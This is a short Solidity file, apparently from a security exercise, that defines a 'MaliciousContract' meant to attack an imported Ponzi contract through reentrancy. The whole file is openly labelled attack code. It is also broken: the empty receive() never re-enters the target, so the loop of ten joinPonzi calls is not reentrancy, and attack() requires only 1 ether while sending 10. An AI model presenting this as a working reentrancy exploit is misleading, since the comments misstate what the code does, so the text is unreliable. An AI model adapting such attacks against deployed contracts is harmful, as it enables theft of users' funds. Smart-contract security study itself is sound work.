// First, deploy a malicious contract that exploits reentrancy
// Malicious contract
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Ponzi.sol";
contract MaliciousContract {
    PonziContract public ponzi;

    constructor(address _ponziAddress) {
        ponzi = PonziContract(payable(_ponziAddress));
    }

   
    function attack() external payable {
        
        require(msg.value >= 1 ether, "Insufficient Ether");

        // Trigger reentrancy by repeatedly calling joinPonzi
        for (uint256 i = 0; i < 10; i++) {
            ponzi.joinPonzi{value: 1 ether}(new address[](0));
        }
    }

    // Receive function to receive Ether
    receive() external payable {}
}
